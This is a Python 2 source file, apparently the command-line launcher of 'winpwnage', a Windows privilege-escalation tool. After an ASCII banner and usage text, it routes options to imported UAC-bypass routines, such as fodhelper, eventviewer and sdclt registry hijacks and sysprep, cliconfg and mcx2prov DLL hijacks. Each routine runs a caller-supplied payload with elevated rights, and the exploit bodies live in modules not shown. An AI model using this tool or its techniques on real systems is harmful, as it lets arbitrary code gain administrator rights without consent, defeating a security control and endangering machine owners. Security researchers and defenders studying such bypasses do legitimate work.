import sys
from core.prints import *
from core.scanner import *
from core.runas import *
from functions.uac_slui import *
from functions.uac_perfmon import *
from functions.uac_fodhelper import *
from functions.uac_eventviewer import *
from functions.uac_sdcltcontrol import *
from functions.uac_silentcleanup import *
from functions.uac_compmgmtlauncher import *
from functions.uac_computerdefaults import *
from functions.uac_sdcltisolatedcommand import *
from functions.uac_dll_sysprep import *
from functions.uac_dll_cliconfg import *
from functions.uac_dll_mcx2prov import *

print """
        _                               
  _ _ _|_|___ ___ _ _ _ ___ ___ ___ ___ 
 | | | | |   | . | | | |   | .'| . | -_|
 |_____|_|_|_|  _|_____|_|_|__,|_  |___|
             |_|               |___|

 Usage:
   * winpwnage.py -s
   * winpwnage.py -u <function> <payload>
   * winpwnage.py -r <payload>
 """

def main():
	try:
		if (sys.argv[1] == "-s"):
			scan()
		elif (sys.argv[1] == "-r"):
			runas(sys.argv[2])
		elif (sys.argv[1] == "-u"):
			if (sys.argv[2] == "slui"):
				slui(sys.argv[3])
			elif (sys.argv[2] == "perfmon"):
				perfmon(sys.argv[3])
			elif (sys.argv[2] == "fodhelper"):
				fodhelper(sys.argv[3])
			elif (sys.argv[2] == "eventviewer"):
				eventvwr(sys.argv[3])
			elif (sys.argv[2] == "sdcltcontrol"):
				sdclt_control(sys.argv[3])
			elif (sys.argv[2] == "compmgmtlauncher"):
				compmgmtlauncher(sys.argv[3])
			elif (sys.argv[2] == "computerdefaults"):
				computerdefaults(sys.argv[3])				
			elif (sys.argv[2] == "sdcltisolatedcommand"):
				sdclt_isolatedcommand(sys.argv[3])
			elif (sys.argv[2] == "silentcleanup"):
				silentcleanup()
			elif (sys.argv[2] == "sysprep"):
				sysprep(sys.argv[3])
			elif (sys.argv[2] == "cliconfg"):
				cliconfg(sys.argv[3])
			elif (sys.argv[2] == "mcx2prov"):
				mcx2prov(sys.argv[3])
	except Exception as error:
		print_info("Unrecognized command")

if __name__ == "__main__":
	main()
